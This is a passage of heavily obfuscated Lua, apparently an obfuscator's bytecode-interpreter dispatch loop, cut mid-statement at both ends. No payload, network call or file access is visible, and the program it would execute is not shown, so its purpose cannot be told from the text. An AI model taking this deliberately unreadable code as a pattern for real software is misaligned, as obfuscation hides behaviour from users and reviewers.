if(11>ba)then w[y[684]]=y[897];else n=(n+1);end end else if(ba<13 or(not(ba~=13)))then if(13>ba)then y=f[n];else bb=y[684]end else if not(not(14==ba))then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end ba=(ba+1)end elseif not(z~=206)then if w[y[684]]then n=(n+1);else n=y[897];end;else local ba,bb=0 while true do if(ba==10 or ba<10)then if(ba<4 or ba==4)then if(ba<=1)then if not(0~=ba)then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if(ba<=2)then n=(n+1);else if(4~=ba)then y=f[n];else w[y[684]]=h[y[897]];end end end else if(ba==7 or ba<7)then if(ba<5 or ba==5)then n=(n+1);else if not(6~=ba)then y=f[n];else w[y[684]]=h[y[897]];end end else if(ba<8 or ba==8)then n=n+1;else if(ba>9)then w[y[684]]=h[y[897]];else y=f[n];end end end end else if(ba==15 or ba<15)then if(ba==12 or ba<12)then if(ba>11)then y=f[n];else n=(n+1);end else if(ba<=13)then w[y[684]]=h[y[897]];else if(ba>14)then y=f[n];else n=(n+1);end end end else if((ba==18)or ba<18)then if(ba==16 or ba<16)then w[y[684]]=w[y[897]];else if not(ba==18)then n=(n+1);else y=f[n];end end else if(ba<19 or ba==19)then bb=y[684]else if not(ba~=20)then w[bb](r(w,bb+1,y[897]))else break end end end end end ba=ba+1 end end;elseif(z<208 or z==208)then local ba,bb,bc,bd=0 while true do if(ba<=9)then if(ba==4 or ba<4)then if((ba==1)or(ba<1))then if(ba~=1)then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if(4>ba)then w[y[684]]=h[y[897]];else n=(n+1);end end end else if(ba<=6)then if(5<ba)then w[y[684]]=h[y[897]];else y=f[n];end else if(ba<7 or not(ba~=7))then n=(n+1);else if 9>ba then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if(ba==14 or ba<14)then if(ba<=11)then if(ba==10)then n=(n+1);else y=f[n];end else if(ba<12 or ba==12)then w[y[684]]=w[y[897]][w[y[404]]];else if(ba~=14)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if ba<16 then bd=y[684]else bc={w[bd](w[bd+1])};end else if(ba<17 or ba==17)then bb=0;else if not(not(ba==18))then for be=bd,y[404]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=(ba+1)end elseif(not(z==210))then w[y[684]]=y[897]*w[y[404]];else local ba,bb=0 while true do if(ba<8 or ba==8)then if(ba<=3)then if(not(ba~=1)or ba<1)then if not(not(0==ba))then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if not(ba==3)then n=(n+1);else y=f[n];end end else if(ba==5 or ba<5)then if not(ba~=4)then w[y[684]]=h[y[897]];else n=(n+1);end else if(ba<=6)then y=f[n];else if not(ba~=7)then w[y[684]]=w[y[897]][w[y[404]]];else n=(n+1);end end end end else if(ba<13 or ba==13)then if(ba<=10)then if(10>ba)then y=f[n];else w[y[684]]=h[y[897]];end else if((ba<11)or(ba==11))then n=(n+1);else if(12<ba)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if(ba<15 or ba==15)then if not(15==ba)then n=(n+1);else y=f[n];end else if(ba<16 or ba==16)then bb=y[684]else if(18>ba)then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end end ba=(ba+1)end end;elseif((213>z)or not(not(213==z)))then if(211>=z)then local ba,bb=0 while true do if(not(ba~=10)or ba<10)then if ba<=4 then if(ba<=1)then if not(not(not(ba==1)))then bb=nil else w[y[684]]=j[y[897]];end else if ba<=2 then n=(n+1);else if(4~=ba)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if(ba<7 or ba==7)then if(ba<=5)then n=n+1;else if(ba<7)then y=f[n];else w[y[684]]=y[897];end end else if(ba<8 or not(ba~=8))then n=(n+1);else if(9<ba)then w[y[684]]=y[897];else y=f[n];end end end end else if(ba<15 or not(ba~=15))then if(ba<=12)then if 11<ba then y=f[n];else n=(n+1);end else if(ba<13 or ba==13)then w[y[684]]=y[897];else if 15>ba then n=(n+1);else y=f[n];end end end else if(ba<18 or ba==18)then if(ba==16 or ba<16)then w[y[684]]=y[897];else if not(not(18~=ba))then n=(n+1);else y=f[n];end end else if((ba==19)or(ba<19))then bb=y[684]else if not(ba==21)then w[bb]=w[bb](r(w,(bb+1),y[897]))else break end end end end end ba=(ba+1)end elseif(z>212)then local ba,bb=0 while true do if(ba==7 or ba<7)then if(ba<3 or ba==3)then if(ba<=1)then if ba~=1 then bb=nil else w[y[684]][y[897]]=w[y[404]];end else if(ba>2)then y=f[n];else n=n+1;end end else if(ba<5 or ba==5)then if not(ba~=4)then w[y[684]]={};else n=(n+1);end else if(ba<7)then y=f[n];else w[y[684]][y[897]]=y[404];end end end else if(ba==11 or ba<11)then if(ba<9 or ba==9)then if(8==ba)then n=(n+1);else y=f[n];end else if not(ba~=10)then w[y[684]][y[897]]=w[y[404]];else n=(n+1);end end else if(ba==13 or ba<13)then if not(ba~=12)then y=f[n];else bb=y[684]end else if not(not(ba~=15))then w[bb]=w[bb](r(w,(bb+1),y[897]))else break end end end end ba=(ba+1)end else local ba,bb,bc,bd=0 while true do if(ba<9 or ba==9)then if(ba==4 or ba<4)then if(ba<=1)then if(ba>0)then bc=nil else bb=nil end else if((ba<2)or(ba==2))then bd=nil else if(not(4==ba))then w[y[684]]=j[y[897]];else n=n+1;end end end else if(ba<6 or ba==6)then if(not(5~=ba))then y=f[n];else w[y[684]]=w[y[897]][y[404]];end else if ba<=7 then n=n+1;else if not(not(9~=ba))then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if(ba==14 or ba<14)then if(ba<11 or(ba==11))then if(10==ba)then n=(n+1);else y=f[n];end else if((ba<12)or not(ba~=12))then w[y[684]]=w[y[897]][y[404]];else if(14>ba)then n=(n+1);else y=f[n];end end end else if((ba==16)or ba<16)then if(ba~=16)then bd=y[684]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if not(ba~=18)then for be=bd,y[404]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(z==214 or z<214)then local ba,bb,bc,bd=0 while true do if(ba<=9)then if((ba<4)or not(ba~=4))then if(ba<1 or ba==1)then if(ba<1)then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if(ba<4)then w[y[684]]=j[y[897]];else n=(n+1);end end end else if(ba<6 or ba==6)then if(6>ba)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end else if(ba<7 or(ba==7))then n=n+1;else if(ba<9)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if((ba==14)or(ba<14))then if(ba<=11)then if(11>ba)then n=n+1;else y=f[n];end else if(ba<=12)then w[y[684]]=w[y[897]][y[404]];else if not(ba~=13)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if(15<ba)then bc={w[bd](w[bd+1])};else bd=y[684]end else if(ba==17 or ba<17)then bb=0;else if(18==ba)then for be=bd,y[404]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=(ba+1)end elseif(216~=z)then local ba,bb,bc,bd=0 while true do if(ba<=9)then if(ba==4 or ba<4)then if(ba<1 or ba==1)then if not(1==ba)then bb=nil else bc=nil end else if(ba==2 or(ba<2))then bd=nil else if(ba>3)then n=(n+1);else w[y[684]]=h[y[897]];end end end else if(ba==6 or(ba<6))then if not(6==ba)then y=f[n];else w[y[684]]=h[y[897]];end else if(ba<=7)then n=(n+1);else if(ba==8)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if ba<=14 then if(ba==11 or ba<11)then if(10<ba)then y=f[n];else n=n+1;end else if(ba==12 or(ba<12))then w[y[684]]=w[y[897]][w[y[404]]];else if 13==ba then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if ba<16 then bd=y[684]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if(ba>18)then break else for be=bd,y[404]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=(ba+1)end else local ba=0 while true do if(ba==9 or ba<9)then if(ba<=4)then if(ba==1 or ba<1)then if(ba>0)then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else w={};end else if(ba<2 or ba==2)then n=(n+1);else if(4>ba)then y=f[n];else w[y[684]]=y[897];end end end else if(ba==6 or ba<6)then if ba<6 then n=n+1;else y=f[n];end else if(ba<7 or ba==7)then w[y[684]]=h[y[897]];else if not(9==ba)then n=(n+1);else y=f[n];end end end end else if(ba<14 or ba==14)then if(ba<11 or ba==11)then if(10<ba)then n=n+1;else w[y[684]]=h[y[897]];end else if(ba==12 or ba<12)then y=f[n];else if not(not(ba~=14))then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end else if(ba<17 or ba==17)then if(not(ba~=15)or ba<15)then y=f[n];else if(ba>16)then n=(n+1);else w[y[684]]=w[y[897]][w[y[404]]];end end else if ba<=18 then y=f[n];else if(ba==19)then if(not(w[y[684]]==y[404]))then n=(n+1);else n=y[897];end;else break end end end end end ba=(ba+1)end end;elseif(228>=z)then if(222>z or 222==z)then if(not(219~=z)or(219>z))then if(z==217 or z<217)then n=y[897];elseif not(219==z)then local ba=y[684];local bb=w[ba];for bc=(ba+1),y[897]do t(bb,w[bc])end;else local ba=0 while true do if ba<=6 then if(ba<2 or ba==2)then if(ba==0 or ba<0)then w[y[684]]=w[y[897]][y[404]];else if not(2==ba)then n=n+1;else y=f[n];end end else if(ba<=4)then if(ba>3)then n=(n+1);else w[y[684]]=w[y[897]][y[404]];end else if(5<ba)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if ba<=9 then if(ba<7 or ba==7)then n=n+1;else if(ba~=9)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if(ba<11 or ba==11)then if(10<ba)then y=f[n];else n=n+1;end else if(ba==12)then w[y[684]]=w[y[897]][w[y[404]]];else break end end end end ba=(ba+1)end end;elseif(z<=220)then local ba,bb=0 while true do if(ba<=7)then if ba<=3 then if ba<=1 then if(ba<1)then bb=nil else w[y[684]]=h[y[897]];end else if(ba<3)then n=n+1;else y=f[n];end end else if(ba<=5)then if(5>ba)then w[y[684]]=y[897];else n=n+1;end else if ba<7 then y=f[n];else w[y[684]]=y[897];end end end else if ba<=11 then if(ba==9 or ba<9)then if 8<ba then y=f[n];else n=(n+1);end else if not(11==ba)then w[y[684]]=y[897];else n=(n+1);end end else if(ba==13 or ba<13)then if(ba~=13)then y=f[n];else bb=y[684]end else if ba>14 then break else w[bb]=w[bb](r(w,(bb+1),y[897]))end end end end ba=(ba+1)end elseif not(not(z==221))then local ba=y[684]w[ba]=w[ba](r(w,(ba+1),p))else local ba,bb=0 while true do if(ba<9 or ba==9)then if(ba==4 or ba<4)then if(ba==1 or ba<1)then if(1~=ba)then bb=nil else w={};end else if(ba==2 or ba<2)then for bc=0,u,1 do if(bc<o)then w[bc]=s[(bc+1)];else break;end;end;else if 4>ba then n=n+1;else y=f[n];end end end else if(ba<=6)then if ba<6 then w[y[684]]=j[y[897]];else n=(n+1);end else if(ba<=7)then y=f[n];else if(ba<9)then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end end else if(ba<14 or ba==14)then if(ba<=11)then if not(10~=ba)then y=f[n];else w[y[684]]=h[y[897]];end else if ba<=12 then n=(n+1);else if not(ba==14)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if ba<=16 then if 16~=ba then n=(n+1);else y=f[n];end else if(ba<=17)then bb=y[684]else if 18<ba then break else w[bb]=w[bb](w[(bb+1)])end end end end end ba=ba+1 end end;elseif((z<225)or not(z~=225))then if(z<=223)then if(y[684]<w[y[404]])then n=(n+1);else n=y[897];end;elseif not(not(z~=225))then local ba,bb,bc,bd=0 while true do if(ba==9 or ba<9)then if(ba<=4)then if(ba<1 or ba==1)then if not(ba~=0)then bb=nil else bc=nil end else if(ba==2 or ba<2)then bd=nil else if(ba>3)then n=(n+1);else w[y[684]]=h[y[897]];end end end else if(ba<=6)then if ba>5 then w[y[684]]=h[y[897]];else y=f[n];end else if(ba<7 or ba==7)then n=(n+1);else if not(ba==9)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if ba<=14 then if(ba==11 or ba<11)then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if(ba~=14)then n=(n+1);else y=f[n];end end end else if ba<=16 then if 15==ba then bd=y[684]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if ba==18 then for be=bd,y[404]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=(ba+1)end else local ba,bb=0 while true do if(ba==7 or ba<7)then if(ba==3 or ba<3)then if(ba<1 or ba==1)then if not(ba==1)then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if ba==2 then n=(n+1);else y=f[n];end end else if(ba==5 or ba<5)then if(ba<5)then w[y[684]]=y[897];else n=(n+1);end else if not(ba~=6)then y=f[n];else w[y[684]]=y[897];end end end else if(ba<=11)then if(ba<=9)then if ba==8 then n=(n+1);else y=f[n];end else if ba<11 then w[y[684]]=y[897];else n=(n+1);end end else if(ba<=13)then if ba<13 then y=f[n];else bb=y[684]end else if not(ba~=14)then w[bb]=w[bb](r(w,(bb+1),y[897]))else break end end end end ba=ba+1 end end;elseif(226>z or 226==z)then local ba=y[684];p=(ba+x-1);for bb=ba,p do local ba=q[(bb-ba)];w[bb]=ba;end;elseif not(z~=227)then local ba,bb,bc,bd=0 while true do if ba<=9 then if(ba<4 or ba==4)then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if(ba==2 or ba<2)then bd=nil else if 4>ba then w[y[684]]=h[y[897]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[684]]=h[y[897]];end else if(ba<=7)then n=(n+1);else if not(9==ba)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if(ba==14 or ba<14)then if(ba==11 or ba<11)then if(11>ba)then n=n+1;else y=f[n];end else if ba<=12 then w[y[684]]=w[y[897]][w[y[404]]];else if not(ba~=13)then n=(n+1);else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[684]end else if(ba==17 or ba<17)then bb=0;else if ba>18 then break else for be=bd,y[404]do bb=(bb+1);w[be]=bc[bb];end end end end end end ba=(ba+1)end else w[y[684]]=(w[y[897]]+w[y[404]]);end;elseif(234==z or 234>z)then if(231>=z)then if(z<229 or z==229)then local ba,bb=0 while true do if ba<=8 then if(ba<=3)then if(ba<1 or ba==1)then if ba~=1 then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if(2<ba)then y=f[n];else n=n+1;end end else if(ba==5 or ba<5)then if not(ba==5)then w[y[684]]=h[y[897]];else n=n+1;end else if(ba<=6)then y=f[n];else if(8>ba)then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end end end end else if(ba<13 or ba==13)then if(ba==10 or ba<10)then if 9<ba then w[y[684]]=y[897];else y=f[n];end else if ba<=11 then n=(n+1);else if(ba<13)then y=f[n];else w[y[684]]=y[897];end end end else if(ba<=15)then if(ba<15)then n=(n+1);else y=f[n];end else if(ba==16 or ba<16)then bb=y[684]else if ba>17 then break else w[bb]=w[bb](r(w,bb+1,y[897]))end end end end end ba=(ba+1)end elseif not(not(z==230))then local ba,bb=0 while true do if(ba<=7)then if(ba<=3)then if(ba==1 or ba<1)then if ba>0 then w[y[684]]=w[y[897]][y[404]];else bb=nil end else if(ba>2)then y=f[n];else n=(n+1);end end else if(ba<=5)then if not(5==ba)then w[y[684]]=w[y[897]];else n=(n+1);end else if not(ba==7)then y=f[n];else w[y[684]]=h[y[897]];end end end else if(ba<11 or ba==11)then if ba<=9 then if(ba<9)then n=(n+1);else y=f[n];end else if not(11==ba)then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end end else if(ba==13 or ba<13)then if(ba==12)then y=f[n];else bb=y[684]end else if(14<ba)then break else w[bb]=w[bb](r(w,bb+1,y[897]))end end end end ba=ba+1 end else w[y[684]]=b(d[y[897]],nil,j);end;elseif(z<=232)then local ba,bb=0 while true do if(ba==22 or ba<22)then if(ba<10 or ba==10)then if(ba<4 or ba==4)then if(ba==1 or ba<1)then if not(ba==1)then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if(ba<2 or ba==2)then n=(n+1);else if(ba<4)then y=f[n];else w[y[684]]=h[y[897]];end end end else if(ba==7 or ba<7)then if(ba==5 or ba<5)then n=n+1;else if(7>ba)then y=f[n];else w[y[684]]=h[y[897]];end end else if(ba<=8)then n=(n+1);else if 9<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end end else if(ba==16 or ba<16)then if(ba<13 or ba==13)then if(ba<11 or ba==11)then n=n+1;else if 12<ba then w[y[684]]=w[y[897]][w[y[404]]];else y=f[n];end end else if(ba==14 or ba<14)then n=(n+1);else if not(16==ba)then y=f[n];else w[y[684]]={};end end end else if(ba<=19)then if(ba==17 or ba<17)then n=(n+1);else if(ba>18)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end else if ba<=20 then n=(n+1);else if(22>ba)then y=f[n];else w[y[684]][y[897]]=w[y[404]];end end end end end else if(ba<33 or ba==33)then if(ba<27 or ba==27)then if(ba<24 or ba==24)then if not(24==ba)then n=(n+1);else y=f[n];end else if ba<=25 then w[y[684]]=h[y[897]];else if(ba>26)then y=f[n];else n=(n+1);end end end else if(ba==30 or ba<30)then if(ba<28 or ba==28)then w[y[684]]=w[y[897]][y[404]];else if not(ba~=29)then n=n+1;else y=f[n];end end else if(ba==31 or ba<31)then w[y[684]][y[897]]=w[y[404]];else if 33>ba then n=n+1;else y=f[n];end end end end else if ba<=39 then if(ba==36 or ba<36)then if(ba==34 or ba<34)then w[y[684]]=h[y[897]];else if(ba<36)then n=(n+1);else y=f[n];end end else if(ba<=37)then w[y[684]]=w[y[897]][y[404]];else if 39>ba then n=(n+1);else y=f[n];end end end else if(ba<=42)then if(ba<40 or ba==40)then w[y[684]][y[897]]=w[y[404]];else if 42~=ba then n=(n+1);else y=f[n];end end else if(ba<=43)then bb=y[684]else if ba>44 then break else w[bb](r(w,(bb+1),y[897]))end end end end end end ba=(ba+1)end elseif not(233~=z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if(ba==1 or ba<1)then if not(0~=ba)then bb=nil else w[y[684]]=w[y[897]];end else if(3>ba)then n=n+1;else y=f[n];end end else if ba<=5 then if not(5==ba)then w[y[684]]=y[897];else n=(n+1);end else if(7>ba)then y=f[n];else w[y[684]]=y[897];end end end else if(ba<11 or ba==11)then if(ba<=9)then if(9>ba)then n=(n+1);else y=f[n];end else if(ba>10)then n=(n+1);else w[y[684]]=y[897];end end else if(ba<13 or ba==13)then if(ba<13)then y=f[n];else bb=y[684]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end ba=(ba+1)end else if(w[y[684]]<w[y[404]])then n=(n+1);else n=y[897];end;end;elseif(237==z or 237>z)then if((z<235)or not(z~=235))then local ba,bb=0 while true do if(ba==9 or ba<9)then if(ba==4 or ba<4)then if(ba<=1)then if not(0~=ba)then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if(ba==2 or ba<2)then n=n+1;else if(3<ba)then w[y[684]]=y[897];else y=f[n];end end end else if(ba<6 or ba==6)then if(ba~=6)then n=n+1;else y=f[n];end else if ba<=7 then w[y[684]]=h[y[897]];else if not(9==ba)then n=(n+1);else y=f[n];end end end end else if(ba<14 or ba==14)then if(ba==11 or ba<11)then if 11>ba then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end else if ba<=12 then y=f[n];else if 14>ba then bb=y[684];else do return w[bb](r(w,bb+1,y[897]))end;end end end else if(ba<16 or ba==16)then if not(ba==16)then n=n+1;else y=f[n];end else if ba<=17 then bb=y[684];else if(18<ba)then break else do return r(w,bb,p)end;end end end end end ba=ba+1 end elseif not(236~=z)then local ba,bb,bc,bd=0 while true do if(ba==9 or ba<9)then if(ba<=4)then if(ba<1 or ba==1)then if(0==ba)then bb=nil else bc=nil end else if ba<=2 then bd=nil else if(3==ba)then w[y[684]]=h[y[897]];else n=n+1;end end end else if(ba<6 or ba==6)then if(ba<6)then y=f[n];else w[y[684]]=h[y[897]];end else if(ba==7 or ba<7)then n=n+1;else if 9>ba then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if ba<=14 then if(ba==11 or ba<11)then if not(ba==11)then n=n+1;else y=f[n];end else if(ba==12 or ba<12)then w[y[684]]=w[y[897]][w[y[404]]];else if ba==13 then n=n+1;else y=f[n];end end end else if(ba==16 or ba<16)then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[684]end else if ba<=17 then bb=0;else if not(ba==19)then for be=bd,y[404]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=(ba+1)end else w[y[684]]=(w[y[897]]-w[y[404]]);end;elseif z<=238 then if(y[684]<w[y[404]])then n=n+1;else n=y[897];end;elseif(z<240)then local ba=0 while true do if(ba<8 or ba==8)then if(ba==3 or ba<3)then if ba<=1 then if not(0~=ba)then w={};else for bb=0,u,1 do if bb<o then w[bb]=s[(bb+1)];else break;end;end;end else if 2<ba then y=f[n];else n=(n+1);end end else if(ba<=5)then if ba<5 then w[y[684]]=h[y[897]];else n=(n+1);end else if(ba<6 or ba==6)then y=f[n];else if not(8==ba)then w[y[684]]=(w[y[897]]+y[404]);else n=n+1;end end end end else if(ba<12 or ba==12)then if(ba<10 or ba==10)then if ba==9 then y=f[n];else h[y[897]]=w[y[684]];end else if ba<12 then n=n+1;else y=f[n];end end else if ba<=14 then if ba==13 then w[y[684]]=h[y[897]];else n=(n+1);end else if(ba<=15)then y=f[n];else if ba==16 then w[y[684]]();else break end end end end end ba=(ba+1)end else local ba,bb=0 while true do if ba<=13 then if(ba<6 or ba==6)then if(ba<2 or ba==2)then if(ba<=0)then bb=nil else if(2>ba)then w[y[684]]={};else n=n+1;end end else if(ba<=4)then if not(4==ba)then y=f[n];else w[y[684]]=h[y[897]];end else if ba>5 then y=f[n];else n=n+1;end end end else if(ba<=9)then if(ba<=7)then w[y[684]]=w[y[897]][y[404]];else if not(ba==9)then n=(n+1);else y=f[n];end end else if(ba<11 or ba==11)then if ba>10 then n=n+1;else w[y[684]][y[897]]=w[y[404]];end else if(13~=ba)then y=f[n];else w[y[684]]=j[y[897]];end end end end else if ba<=20 then if(ba==16 or ba<16)then if(ba<=14)then n=(n+1);else if(ba==15)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end else if(ba<=18)then if ba>17 then y=f[n];else n=n+1;end else if(19<ba)then n=(n+1);else w[y[684]]=j[y[897]];end end end else if(ba<=23)then if(ba==21 or ba<21)then y=f[n];else if not(ba==23)then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end else if(ba<25 or ba==25)then if(25>ba)then y=f[n];else bb=y[684]end else if 27>ba then w[bb]=w[bb]()else break end end end end end ba=(ba+1)end end;elseif(z==264 or z<264)then if(252==z or 252>z)then if((246>z)or not(246~=z))then if 243>=z then if(z==241 or(z<241))then w[y[684]]=false;elseif not(z==243)then local ba=0 while true do if(ba<=6)then if ba<=2 then if(ba<0 or ba==0)then w[y[684]]=false;else if not(ba==2)then n=n+1;else y=f[n];end end else if(ba<=4)then if 4>ba then w[y[684]]=h[y[897]];else n=n+1;end else if(5<ba)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if(ba<9 or ba==9)then if(ba<=7)then n=(n+1);else if ba>8 then w[y[684]]=w[y[897]][w[y[404]]];else y=f[n];end end else if(ba<11 or ba==11)then if(ba<11)then n=n+1;else y=f[n];end else if(13>ba)then if(w[y[684]]~=y[404])then n=(n+1);else n=y[897];end;else break end end end end ba=ba+1 end else local ba=y[684];p=(ba+x)-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;end;elseif(z<=244)then local q=d[y[897]];local x={};local ba={};for bb=1,y[404]do n=(n+1);local bc=f[n];if not(not(not(bc[828]~=275)))then ba[bb-1]={w,bc[897],nil,nil,nil,nil,nil,nil};else ba[(bb-1)]={h,bc[897],nil,nil,nil,nil,nil};end;v[(#v+1)]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});w[y[684]]=b(q,x,j);elseif not(not(246~=z))then w[y[684]][y[897]]=y[404];else local q,x=0 while true do if(q<=8)then if(q<3 or q==3)then if(q<1 or q==1)then if not(0~=q)then x=nil else w[y[684]]=j[y[897]];end else if 3>q then n=(n+1);else y=f[n];end end else if(q==5 or q<5)then if(4<q)then n=(n+1);else w[y[684]]=w[y[897]][y[404]];end else if q<=6 then y=f[n];else if 8>q then w[y[684]]=y[897];else n=n+1;end end end end else if(q==13 or q<13)then if(q<10 or q==10)then if q>9 then w[y[684]]=y[897];else y=f[n];end else if(q<=11)then n=(n+1);else if(13>q)then y=f[n];else w[y[684]]=y[897];end end end else if(q<15 or q==15)then if not(q~=14)then n=n+1;else y=f[n];end else if q<=16 then x=y[684]else if(q>17)then break else w[x]=w[x](r(w,(x+1),y[897]))end end end end end q=(q+1)end end;elseif(z<249 or z==249)then if(247==z or(247>z))then local q,x=0 while true do if(q==7 or q<7)then if(q==3 or(q<3))then if(q<=1)then if not(not(0==q))then x=nil else w[y[684]]=h[y[897]];end else if(q~=3)then n=(n+1);else y=f[n];end end else if(q<5 or q==5)then if not(q==5)then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end else if(q~=7)then y=f[n];else w[y[684]]=y[897];end end end else if(q<=11)then if(q<9 or q==9)then if(q<9)then n=(n+1);else y=f[n];end else if(q>10)then n=n+1;else w[y[684]]=y[897];end end else if(q<=13)then if not(q~=12)then y=f[n];else x=y[684]end else if(14==q)then w[x]=w[x](r(w,(x+1),y[897]))else break end end end end q=(q+1)end elseif not(not(248==z))then w[y[684]]=h[y[897]];else local q=y[684]w[q](r(w,(q+1),p))end;elseif(not(250~=z)or 250>z)then local q=y[684]local x={}for ba=1,#v do local bb=v[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if((bc>q)or not(bc~=q))then x[bc]=w[bc]bb[1]=x v[ba]=nil;end end end elseif(not(z==252))then if(not(w[y[684]]==y[404]))then n=(n+1);else n=y[897];end;else local q,x=0 while true do if(q<=8)then if q<=3 then if(q<1 or q==1)then if(0<q)then w[y[684]]=w[y[897]][y[404]];else x=nil end else if(q~=3)then n=(n+1);else y=f[n];end end else if q<=5 then if(q<5)then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end else if(q<6 or q==6)then y=f[n];else if(q~=8)then w[y[684]]=w[y[897]][y[404]];else n=n+1;end end end end else if q<=13 then if(q<=10)then if(9==q)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end else if(q<=11)then n=n+1;else if(12<q)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end else if(q<=15)then if 15~=q then n=n+1;else y=f[n];end else if(q<16 or q==16)then x=y[684]else if 18>q then w[x]=w[x](w[x+1])else break end end end end end q=q+1 end end;elseif(z<258 or z==258)then if(255==z or 255>z)then if(253>=z)then if(not(w[y[684]]~=w[y[404]])or w[y[684]]<w[y[404]])then n=n+1;else n=y[897];end;elseif(254<z)then local q,x,ba,bb,bc=0 while true do if(q<=9)then if(q<4 or q==4)then if(q<1 or q==1)then if(q~=1)then x=nil else ba,bb=nil end else if(q<=2)then bc=nil else if q<4 then w[y[684]]=w[y[897]];else n=(n+1);end end end else if(q<=6)then if(6>q)then y=f[n];else w[y[684]]=y[897];end else if(q<7 or q==7)then n=n+1;else if not(9==q)then y=f[n];else w[y[684]]=y[897];end end end end else if q<=14 then if(q<=11)then if(11~=q)then n=n+1;else y=f[n];end else if(q<12 or q==12)then w[y[684]]=y[897];else if not(14==q)then n=n+1;else y=f[n];end end end else if(q<17 or q==17)then if(q<=15)then bc=y[684]else if not(17==q)then ba,bb=i(w[bc](r(w,bc+1,y[897])))else p=bb+bc-1 end end else if(q<=18)then x=0;else if not(19~=q)then for bb=bc,p do x=x+1;w[bb]=ba[x];end;else break end end end end end q=(q+1)end else if(not(w[y[684]]==y[404]))then n=y[897];else n=n+1;end;end;elseif(z<256 or z==256)then local q,x=0 while true do if(q==8 or(q<8))then if((q==3)or q<3)then if(q<1 or q==1)then if not(not(q==0))then x=nil else w[y[684]]=w[y[897]][y[404]];end else if(not(2~=q))then n=(n+1);else y=f[n];end end else if(not(q~=5)or(q<5))then if(not(5==q))then w[y[684]]=h[y[897]];else n=(n+1);end else if(q==6 or q<6)then y=f[n];else if(q>7)then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end end end else if(q<=13)then if(not(q~=10)or q<10)then if not(10==q)then y=f[n];else w[y[684]]=y[897];end else if(q<11 or q==11)then n=n+1;else if not(not(q==12))then y=f[n];else w[y[684]]=y[897];end end end else if(q<15 or q==15)then if(not(q~=14))then n=(n+1);else y=f[n];end else if(q<=16)then x=y[684]else if(q>17)then break else w[x]=w[x](r(w,(x+1),y[897]))end end end end end q=(q+1)end elseif(z<258)then local q,x,ba,bb=0 while true do if q<=9 then if(q<4 or q==4)then if(q<1 or q==1)then if q<1 then x=nil else ba=nil end else if(q==2 or q<2)then bb=nil else if(q<4)then w[y[684]]=j[y[897]];else n=(n+1);end end end else if q<=6 then if q<6 then y=f[n];else w[y[684]]=w[y[897]][y[404]];end else if(q==7 or q<7)then n=(n+1);else if not(9==q)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end end else if(q==14 or q<14)then if(q<11 or q==11)then if not(q~=10)then n=n+1;else y=f[n];end else if(q<=12)then w[y[684]]=w[y[897]][y[404]];else if not(14==q)then n=(n+1);else 